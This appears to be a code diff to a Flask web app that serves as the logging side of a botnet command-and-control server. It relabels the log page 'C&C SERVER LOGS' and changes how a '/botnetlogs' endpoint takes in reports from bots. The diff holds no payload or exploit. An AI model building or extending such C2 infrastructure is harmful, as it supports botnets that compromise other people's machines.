@@ -89,7 +89,7 @@ def getLog():
     # simply returning log lines from logging file
     # splitting usage info 
     usageinfo = "" 
-    logresult = "<h1> LOG / {0} </h1> </br>".format(str(datetime.utcnow()))
+    logresult = "<h3> C&C SERVER LOGS / {0} </h3> </br>".format(str(datetime.utcnow()))
     
     with open(logPath) as logFile:
         for entry in logFile.readlines():
@@ -100,7 +100,7 @@ def getLog():
     
     if len(usageinfo) != 0:
         logresult += "</br></br>"
-        logresult += "<h2> USAGE STATS </h2> </br>"
+        logresult += "<h3> USAGE STATS </h3> </br>"
         logresult += usageinfo
 
     return logresult, 200
@@ -110,9 +110,11 @@ def getLog():
 @app.route('/botnetlogs', methods=['POST'])
 def addBotnetLogs():
     # retrieving from post and formatting entries
-    botnet = request.json['botnet']
-    log    = request.json['log']
-    app.logger.info("[{0}] => reached by botnet {1} - usage: {2}".format(str(datetime.utcnow()), str(botnet), str(log)))
+    botnet = request.form['botnet']
+    log    = request.form['log']
+    # polishing log
+    if len(log) != 1:
+        app.logger.info("[{0}] => reached by botnet {1} - usage: {2}".format(str(datetime.utcnow()), str(botnet), str(log)))
     
     return "OK", 200
 
